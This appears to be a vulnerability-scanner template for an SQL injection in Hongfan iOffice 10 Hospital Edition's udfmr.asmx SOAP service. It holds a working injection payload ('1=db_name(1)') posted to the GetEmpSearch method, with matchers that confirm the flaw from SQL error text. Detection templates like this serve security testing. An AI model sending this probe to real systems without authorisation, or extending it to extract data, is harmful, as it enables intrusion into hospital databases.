id: hongfan-ioffice-sqli
brief:
    title: Hongfan OA udfmr.asmx - SQL injection
    by: SleepingBag945
    level: high
    about: There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.
    label:
        - hongfan
        - oa
        - sqli
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/iOffice/prg/set/wss/udfmr.asmx'
      head:
        Content-Type: text/xml; charset=utf-8
        SOAPAction: http://tempuri.org/ioffice/udfmr/GetEmpSearch
      body: |-
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
              <condition>1=db_name(1)</condition>
            </GetEmpSearch>
          </soap:Body>
        </soap:Envelope>
      signs:
        - "on": word
          has:
            - 'System.Data.SqlClient.SqlException:'
            - nvarchar
          in: body
          need: all
        - "on": word
          has:
            - text/xml
          in: header
          need: all
        - "on": status
          status:
            - 500
